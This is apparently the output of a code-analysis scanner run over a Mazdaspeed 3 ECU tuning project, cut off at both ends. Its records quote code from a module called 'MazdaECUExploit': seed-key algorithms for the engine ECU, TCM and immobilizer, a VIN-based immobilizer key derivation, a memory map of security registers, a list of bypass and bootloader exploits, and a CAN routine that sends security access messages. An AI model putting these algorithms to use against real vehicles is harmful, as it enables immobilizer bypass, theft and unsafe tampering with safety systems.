284, "protocol": "CAN", "content": "raise ImportError(\"The 'python-can' library is required for CANInjection.\")"}, {"type": "protocol", "line": 290, "protocol": "CAN", "content": "logging.warning(\"Simulating receiving a seed from the CAN bus.\")"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "return b'\\x67\\x01\\xA1\\xB2\\xC3\\xD4' # Example response: 0x67 0x01 followed by 4 seed bytes"}, {"type": "protocol", "line": 294, "protocol": "CAN", "content": "\"\"\"MAZDASPEED 3 SPECIFIC CAN IDENTIFIERS\"\"\""}, {"type": "protocol", "line": 296, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu': 0x7E0,"}, {"type": "protocol", "line": 297, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag': 0x7E3,"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 301, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 307, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x10)"}, {"type": "protocol", "line": 321, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01]),"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),"}, {"type": "protocol", "line": 393, "protocol": "CAN", "content": "logging.info(\"\\n6. CAN INJECTION (SIMULATED)\")"}, {"type": "protocol", "line": 399, "protocol": "CAN", "content": "logging.error(f\"CAN injection simulation failed: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ECU", "content": "class MazdaECUExploit:"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "\"\"\"COMPLETE MAZDASPEED 3 ECU EXPLOITATION FRAMEWORK\"\"\""}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "self.security_level = \"FACTORY_DEALER_ACCESS\""}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "self.ecu_memory_map = self.map_ecu_memory()"}, {"type": "hardware", "line": 35, "hardware": "immobilizer", "content": "logging.warning(\"Using dummy VIN for immobilizer key derivation.\")"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "'ecu_access_27': {"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "hardware", "line": 48, "hardware": "TCM", "content": "'tcm_access_27': {"}, {"type": "hardware", "line": 50, "hardware": "TCM", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 55, "hardware": "immobilizer", "content": "'immobilizer_27': {"}, {"type": "hardware", "line": 56, "hardware": "immobilizer", "content": "'description': 'Immobilizer system access',"}, {"type": "hardware", "line": 57, "hardware": "immobilizer", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "hardware", "line": 75, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 76, "hardware": "TCM", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 85, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "hardware", "line": 86, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "hardware", "line": 96, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 100, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "def map_ecu_memory(self):"}, {"type": "hardware", "line": 104, "hardware": "ECU", "content": "\"\"\"COMPLETE MEMORY MAP OF MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 118, "hardware": "TCM", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "'security_areas': {"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "'method': 'Dump entire ECU memory via extended diagnostics',"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "'target': 'ECU flash memory',"}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "'security_bypass': {"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "'method': 'Bypass security access without valid key',"}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "'target': '0x27 security service',"}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "'method': 'Compromise ECU bootloader for permanent access',"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "'target': 'Boot sector of ECU',"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "def execute_memory_dump(self):"}, {"type": "hardware", "line": 255, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE ECU MEMORY VIA DIAGNOSTIC EXPLOIT\"\"\""}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "for area_name, area in MazdaECUExploit().ecu_memory_map.items():"}, {"type": "hardware", "line": 280, "hardware": "CAN bus", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "hardware", "line": 286, "hardware": "ECU", "content": "self.ecu_ids = self.enumerate_ecu_ids()"}, {"type": "hardware", "line": 290, "hardware": "CAN bus", "content": "logging.warning(\"Simulating receiving a seed from the CAN bus.\")"}, {"type": "hardware", "line": 293, "hardware": "ECU", "content": "def enumerate_ecu_ids(self):"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "'engine_ecu': 0x7E0,"}, {"type": "hardware", "line": 297, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 298, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 301, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 304, "hardware": "ECU", "content": "def inject_diagnostic_session(self, target_ecu, session_type):"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 315, "hardware": "ECU", "content": "return f\"Started {session_type} session on {target_ecu}\""}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "def security_access_attack(self, target_ecu):"}, {"type": "hardware", "line": 318, "hardware": "ECU", "content": "\"\"\"AUTOMATED SECURITY ACCESS ATTACK\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 329, "hardware": "ECU", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "hardware", "line": 331, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 336, "hardware": "ECU", "content": "return f\"Security access granted to {target_ecu}\""}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "return \"Security access failed\""}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "logging.info(\"MAZDASPEED 3 COMPLETE SECURITY & TUNING EXPLOITATION\")"}, {"type": "hardware", "line": 346, "hardware": "ECU", "content": "ecu_exploit = MazdaECUExploit()"}, {"type": "hardware", "line": 350, "hardware": "ECU", "content": "logging.info(\"\\n1. ECU SECURITY ACCESS BYPASS\")"}, {"type": "hardware", "line": 352, "hardware": "ECU", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "logging.info(\"\\n2. ECU MEMORY MAP EXPLOITATION\")"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "for area_name, area in ecu_exploit.ecu_memory_map.items():"}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "dump_payloads = diagnostic_exploits.execute_memory_dump()"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "result = diagnostic_exploits.can_injection.security_access_attack('engine_ecu')"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 13, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 13, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 29, "pattern": "key", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 29, "pattern": "algorithm", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 35, "pattern": "key", "content": "logging.warning(\"Using dummy VIN for immobilizer key derivation.\")"}, {"type": "security_pattern", "line": 38, "pattern": "key", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 38, "pattern": "seed", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 39, "pattern": "key", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 39, "pattern": "seed", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 39, "pattern": "algorithm", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 40, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 43, "pattern": "algorithm", "content": "'algorithm': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 44, "pattern": "seed", "content": "'seed_bytes': 4,"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'key_bytes': 4,"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 51, "pattern": "seed", "content": "'seed_bytes': 2,"}, {"type": "security_pattern", "line": 52, "pattern": "key", "content": "'key_bytes': 2,"}, {"type": "security_pattern", "line": 57, "pattern": "algorithm", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "'seed_bytes': 8,"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "'key_bytes': 8,"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "'vulnerability': 'DES with weak key derivation'"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 65, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 65, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 66, "pattern": "algorithm", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "security_pattern", "line": 67, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 68, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 75, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 75, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 76, "pattern": "algorithm", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 78, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 79, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 81, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 83, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 85, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 86, "pattern": "algorithm", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "vin_key = self._derive_vin_key()"}, {"type": "security_pattern", "line": 88, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "des_key = vin_key[:8]"}, {"type": "security_pattern", "line": 90, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 90, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 90, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 91, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 91, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 92, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 92, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 93, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 95, "pattern": "key", "content": "def _derive_vin_key(self):"}, {"type": "security_pattern", "line": 96, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 99, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 99, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 100, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "return key[:24]"}, {"type": "security_pattern", "line": 149, "pattern": "algorithm", "content": "\"\"\"REAL-TUNE AI TUNING ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 243, "pattern": "key", "content": "'method': 'Bypass security access without valid key',"}, {"type": "security_pattern", "line": 245, "pattern": "key", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 245, "pattern": "seed", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 288, "pattern": "seed", "content": "def _receive_seed(self):"}, {"type": "security_pattern", "line": 290, "pattern": "seed", "content": "logging.warning(\"Simulating receiving a seed from the CAN bus.\")"}, {"type": "security_pattern", "line": 291, "pattern": "seed", "content": "return b'\\x67\\x01\\xA1\\xB2\\xC3\\xD4' # Example response: 0x67 0x01 followed by 4 seed bytes"}, {"type": "security_pattern", "line": 317, "pattern": "security_access", "content": "def security_access_attack(self, target_ecu):"}, {"type": "security_pattern", "line": 319, "pattern": "seed", "content": "seed_msg = can.Message("}, {"type": "security_pattern", "line": 324, "pattern": "seed", "content": "self.bus.send(seed_msg)"}, {"type": "security_pattern", "line": 326, "pattern": "seed", "content": "seed_response = self._receive_seed()"}, {"type": "security_pattern", "line": 327, "pattern": "seed", "content": "if seed_response:"}, {"type": "security_pattern", "line": 328, "pattern": "seed", "content": "seed = seed_response[2:6]"}, {"type": "security_pattern", "line": 329, "pattern": "key", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 329, "pattern": "seed", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 329, "pattern": "algorithm", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 330, "pattern": "key", "content": "key_msg = can.Message("}, {"type": "security_pattern", "line": 332, "pattern": "key", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),"}, {"type": "security_pattern", "line": 335, "pattern": "key", "content": "self.bus.send(key_msg)"}, {"type": "security_pattern", "line": 351, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 352, "pattern": "key", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 352, "pattern": "seed", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 352, "pattern": "algorithm", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 353, "pattern": "key", "content": "logging.info(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 353, "pattern": "seed", "content": "logging.info(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 396, "pattern": "security_access", "content": "result = diagnostic_exploits.can_injection.security_access_attack('engine_ecu')"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "ui/dialogs/cable_selector_dialog.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/dialogs/flash_warning_dialog.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/dialogs/log_export_dialog.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/dialogs/tune_save_dialog.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/main_window.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/style.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/tabs/dashboard_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/tabs/diagnostics_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "ui/tabs/dyno_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/tabs/logs_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/tabs/security_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "ui/tabs/torque_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/tabs/tuning_tab.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "ui/widgets/abs_srs_view.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/connection_panel.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/dtc_view.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/dyno_view.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/live_gauges.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/logging_view.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/map_table_editor.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ui/widgets/security_panel.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "ui/widgets/torque_view.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "utils/logger.py", "lines_read": 111, "features_found": [{"type": "function", "name": "get_logger", "line": 108}, {"type": "function", "name": "format", "line": 30}, {"type": "function", "name": "__init__", "line": 41}, {"type": "function", "name": "_setup_logger", "line": 45}, {"type": "function", "name": "debug", "line": 81}, {"type": "function", "name": "info", "line": 85}, {"type": "function", "name": "warning", "line": 89}, {"type": "function", "name": "error", "line": 93}, {"type": "function", "name": "critical", "line": 97}, {"type": "function", "name": "exception", "line": 101}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "colorama", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Optional", "line": null}, {"type": "import", "module": "colorama", "line": null}, {"type": "import", "module": "Fore,", "line": null}], "components_found": [{"type": "class", "name": "ColoredFormatter", "line": 19}, {"type": "class", "name": "VersaLogger", "line": 35}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "versa1.py", "lines_read": 377, "features_found": [{"type": "function", "name": "__init__", "line": 42}, {"type": "function", "name": "connect", "line": 63}, {"type": "function", "name": "disconnect", "line": 94}, {"type": "function", "name": "_test_connection", "line": 107}, {"type": "function", "name": "send_request", "line": 115}, {"type": "function", "name": "_message_listener", "line": 175}, {"type": "function", "name": "read_vin", "line": 200}, {"type": "function", "name": "read_ecu_part_number", "line": 219}, {"type": "function", "name": "read_memory", "line": 232}, {"type": "function", "name": "read_dtcs", "line": 253}, {"type": "function", "name": "_parse_dtc_code", "line": 285}, {"type": "function", "name": "_get_dtc_description", "line": 307}, {"type": "function", "name": "clear_dtcs", "line": 327}, {"type": "function", "name": "read_live_data", "line": 338}, {"type": "function", "name": "_parse_pid_value", "line": 355}, {"type": "function", "name": "response_callback", "line": 147}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [{"type": "class", "name": "VersaTunerECU", "line": 19}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "CAN", "content": "ECU Communication Module - Handles all CAN bus and diagnostic communication"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_REQUEST_ID = 0x7E0"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "ECU_RESPONSE_ID = 0x7E8"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "BROADCAST_ID = 0x7DF"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "'DIAGNOSTIC_SESSION': 0x10,"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_RESET': 0x11,"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "'READ_DATA': 0x22,"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "'READ_MEMORY': 0x23,"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "'SECURITY_ACCESS': 0x27,"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "'ROUTINE_CONTROL': 0x31,"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "'WRITE_DATA': 0x2E,"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "'WRITE_MEMORY': 0x3D"}, {"type": "protocol", "line": 47, "protocol": "CAN", "content": "interface: CAN interface name (can0, vcan0, etc.)"}, {"type": "protocol", "line": 48, "protocol": "CAN", "content": "bitrate: CAN bus bitrate in bits per second"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "self.session_control = 0x01  # Default session"}, {"type": "protocol", "line": 65, "protocol": "CAN", "content": "Connect to CAN bus and initialize communication"}, {"type": "protocol", "line": 90, "protocol": "CAN", "content": "self.logger.error(f\"Failed to connect to CAN bus: {e}\")"}, {"type": "protocol", "line": 95, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN bus and cleanup resources\"\"\""}, {"type": "protocol", "line": 128, "protocol": "0x[0-9A-Fa-f]+", "content": "return ECUResponse(False, b'', time.time(), error_code=0xFF)"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "return ECUResponse(False, b'', time.time(), error_code=0x78)  # Timeout"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "return ECUResponse(False, b'', time.time(), error_code=0xFF)"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "service_request = message.data[1] if service_response == 0x7F else message.data[0] - 